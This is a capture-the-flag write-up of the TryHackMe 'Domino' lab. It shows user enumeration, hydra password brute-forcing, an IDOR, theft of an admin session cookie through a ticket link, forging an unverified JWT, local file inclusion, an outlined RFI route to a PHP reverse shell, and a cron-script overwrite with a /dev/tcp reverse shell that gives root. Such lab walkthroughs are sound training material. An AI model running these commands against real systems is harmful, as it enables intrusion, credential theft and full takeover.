# Domino - Jr Penetration Tester Challenge

> This is the first challenge of the end module of the new _Jr Penetration Tester_ path on TryHackMe. It's rated medium and takes 60 minutes to complete. It starts with a basic discovery, followed by a credential bruteforce, session hijacking, Local File Inclusion (or RFI if you choose another path), credential reuse and a cron job running a bash script that the devops user has too much privileges over.

## Discovery

I always start things with a basic discovery. `nmap`, and if i find an application `gobuster` too. I run nmap with the default top ports and if I don't find anything I increase its surface with `-p-`.

```text
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu 
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- I'm ommiting unecessary parts of the scan to keep it clean, but it didn't find anything of value.

We have an application on port 80, so let's use `gobuster` to see if we can find juicy directories to explore.

```text
/support/
/static/
/api
/config.php
/backup/
/forgot.php
/auth.php
/dashboard.php
```

- Again, ommiting unecessary parts.

The application has a login page, a forgot password feature and a `our team` page. The forgot password has a non standard response message to unknown users leading to a User Enumeration flaw. So, we will get the e-mails from the `our team` page using `CeWL` and the forgot password to test for valid users:

```bash
cewl -e http://<ip>/team.php | grep "@nexus" | sed 's/@.*$//g' >> users.txt
```

```bash
ffuf -X POST -u http://<ip>/forgot.php -w users.txt -H "content-type: application/x-www-form-urlencoded" -d "username=FUZZ" -fr "No account found with that username."
```

Every user we found is a valid user! We will have something like this:

```bash
david.brown
emma.taylor
james.wright
laura.hayes
michael.chen
robert.wilson
sarah.johnson
```

I will tell you what will work and then I will tell you a rabbit hole I fell into. With the valid users inside `user.txt`, you need to bruteforce it.

```bash
hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt <ip> http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials" -I -T5
```

I don't like pure no effort bruteforce in CTFs. It feels cheap. When you need to make a custom wordlist with masks, it's not that bad. But I don't like bruteforcing users and passwords with rockyou and similars. The bruteforce will give you valid credentials to use and now I will tell you the rabbit hole.

### The sad rabbit hole

I will quickly tell you what I did and didn't work, because I lost too much time on it and I want it to be a lesson for future me. Inside the `backup` directory, you will find two files: `README.txt` and `config.enc`. The first points you to `/static/app.js` for the steps to decrypt the second. Inside this path, you'll find a `N3xusK3y2024!!` password to decode `config.enc`. I used base64 to encode the .enc file and decrypted it in a random AES ECB online, the results are the following:

```txt
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

This is a dead end. I wasted a lot of time trying to use this and couldn't. I tried to use the password I found to password spray the valid users, tried to make a custom wordlist based on this password, nothing worked. Then, and only then, I came back to bruteforce and in less than 5 minutes I had the initial access.

## Horizontal Privilege Escalation

With access to the dashboard, things flow smoothly. First, if we take a look at "My profile API", we'll see that it gets data from `api/users/profile.php?id=4`. Simple IDOR, changing the id to `1` gives us `laura.hayes`, the admin, and the first flag (which I redacted) !

```json
{
  "id": 1,
  "username": "laura.hayes",
  "email": "laura.hayes@nexus.corp",
  "role": "admin",
  "notes": "THM{}"
}
```

Going back to the dashboard, we can see two ticket options. One to see tickets status and one to create a new ticket. We don't bruteforce `>:(` so let's understand the ticket system behavior by creating a new ticket. We will see something like this:

```text
Ticket Created -> Starts with 'Pending' status -> Someone reviews it -> Ticket change to 'Reviewed' status
```

When we create a ticket, we get a message that gives us information on who is reviewing the tickets: `Ticket submitted successfully. An admin will review it shortly.`. 

We need to get that session cookie! Let's make some assumptions:
- Probably a Blind Stored XSS, but we cant be sure because we can't open the ticket to test for `alert(1)`.
- What if the person reviewing the tickets is sloppy and didn't get that security training to not click random links?

Let's start by just dropping a HTTP link to our IP and watching the ticket status. We will open a HTTP server with python and waiting for a GET request.

Open the server:

```bash
python3 -m http.server 80
```

Create a ticket with a text like this:

```text
http://<local_ip>
```

And look at that, we got something!

```text
<target> - - [17/Jun/2026 09:31:29] "GET / HTTP/1.1" 200 -
```

We want to get the admin user cookies. Fortunately for us, the `Set-Cookie` header is lacking the `SameSite` attribute! Let's run a `nc` listener on port 80 and create another ticket with `http://<local_ip>` to see if we can get that cookie.

Listen:

```bash
nc -lvnp 80
```

Boom!

```text
GET / HTTP/1.1
Host: <local_ip>
Cookie: nexus_session=<session_cookie>
```

The session cookie has two parts: A base64 encoded json with users info and a signature. That signature is what prevents us from forging session cookies. Changing our cookie to the one we got, we get admin access to the dashboard. We hijacked the admin session! Great, now we have access to a path called `admin/index.php` and inside it we can find the second flag. The flag talks about blind XSS, but I got the connection by just dropping a `http://` link.

## Getting a Shell

Dashboard information again. We see that there are two paths: `/api/files.php?name=` that screams LFI/RFI and `/api/auth/token.php`, which generate a JWT token needed to access `files.php`.

Even with an admin session, we get an user jwt. When we try to access the `files.php` with `Authorization: Bearer <token>`, we get an error saying `Admin JWT required. Check your token payload`. Luckly for us, JWT is just base64. 

The first part is the header with infromation about what algorithm was used to sign it. The second part is the payload, that is, the body of the token. And lastly we have a signature, that checks the token integrity. To change a JWT token payload, we need to get its secret to make a new signature when we change it.

Bruteforce `:(` is a possibility here, and also token secret leak sometimes. But sometimes, the environment is misconfigured, and the application only checks the token payload and doesn't make an integrity check. 

Let's just change the role from `user` to `admin` and see if it works. You can do it by hand with base64, an online site or, in my case, burp suite inspector. Do a get request to `/api/files.php?name=/etc/passwd`, intercept it, insert `Authorization: Bearer <token>` with your spoofed token and forward it.

```json
{
	"error":"Access denied: path must be within \/var\/www\/html\/"
}
```

Ok, we can use Local File Include (LFI) to enumerate things like `config.php` and see if we can farm creds.

`/api/files.php?name=/var/www/html/config.php`:

```php
<?php
	define('DB_HOST', 'localhost');
	define('DB_NAME', 'nexusdb');
	define('DB_USER', 'app_user');
	define('DB_PASS', '<DB_PASS>'); // REDACTED
	define('JWT_SECRET', '<JWT_SECRET>'); // REDACTED
	define('APP_SECRET', '<APP_SECRET>'); // REDACTED
	
	function get_db() {
	    $pdo = new PDO('mysql:host='.DB_HOST.';
	    dbname='.DB_NAME, DB_USER, DB_PASS);
	    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	    return $pdo;
	}
?>
```

Lots of good info! We got the `JWT_SECRET`, but we don't need to sign it. We got the `APP_SECRET` to forge session cookies if needed, and a `DB_PASS` database password. 

This is not the route I took, but we could do a Remote File Inclusion (RFI) to make the application connect to our machine and include a PHP reverse shell for access. It would look something like this:
- Generate PHP revshell.
	- Or copy it from `/usr/share/webshells/PHP` on kali.
		- Change `IP` and `Port` as needed.
- Open a `python3 -m http.server 80` and a `nc -lvnp <shell_port>`.
- Call your `shell.php`
	- `/api/files.php?name=http://<local_ip>/shell.php`

Before doing that I decided to try the `system_user` info I got from the previous rabbit hole with the password and it worked! `cat /opt/flag3.txt` will give us the third flag and a hint that we were actually supposed to do the RFI route.

## Privilege Escalation

We can do `cat user.txt` to get the devops user's flag. The privilege escalation to root is also very easy. Inside `/opt/monitoring` we have a `health_report.sh` file and we have write privileges on it. Inside `/opt/tools` you can find `pspy64` and see that root is calling this bash script every minute or so. Just change the `health_report.sh` contents to a reverse shell and open a listener:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<local_ip>/9988 0>&1
```

That's it, we've got root! Just `cat /root/root.txt` your flag and done.
